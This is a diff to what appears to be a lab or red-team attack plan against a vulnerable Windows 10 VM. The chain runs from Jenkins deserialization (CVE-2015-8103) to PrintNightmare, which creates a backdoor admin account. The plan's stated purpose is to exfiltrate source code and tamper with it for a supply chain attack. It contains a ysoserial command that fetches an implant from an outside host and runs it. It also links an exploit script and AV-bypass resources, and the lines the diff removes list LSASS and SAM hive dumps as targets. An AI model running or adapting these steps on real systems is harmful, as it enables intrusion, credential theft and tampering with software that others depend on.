@@ -5,8 +5,8 @@
 # Info
 - Target             : Windows 10
 - Initial Compromise : Java Deserialization in Jenkins <= 1.638 (CVE-2015-8103)
-- Priv Esc           : Printer Nightmare (CVE-2021-34527)
-- Purpose            : Obtain local/domain credentials + other sensitive files
+- Persistence        : Use Printer Nightmare (CVE-2021-34527) to create backdoor admin account
+- Purpose            : Exfiltrate source/modify source code for supply chain attack
 
 ## Setup vulnerable windows VM
 - Install Windows 10 VM
@@ -26,7 +26,6 @@
     - `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`
     - Example payload that downloads an implant from 192.168.187.13:8080 and executes it:
     - `java -jar ysoserial-all.jar CommonsCollections7 "curl 192.168.187.13:8080/implant.exe --output implant.exe && implant.exe" > payload`
-    - ``
 - Python exploit script:
     - https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
 - Run `python exploit.py [IP] [PORT] /path/to/payload`
@@ -40,9 +39,5 @@
     - Loader + decryptor / packing
     - Lots of ideas here: https://book.hacktricks.xyz/windows-hardening/av-bypass
 - Remove / comment out debugging print statements
-- Covert comm channel
-- What data do we want to exfiltrate?
-    - LSASS.exe dump
-    - SAM / SECURITY hives
-    
+- Max size for file writes is 100 Kb - increase this?
  
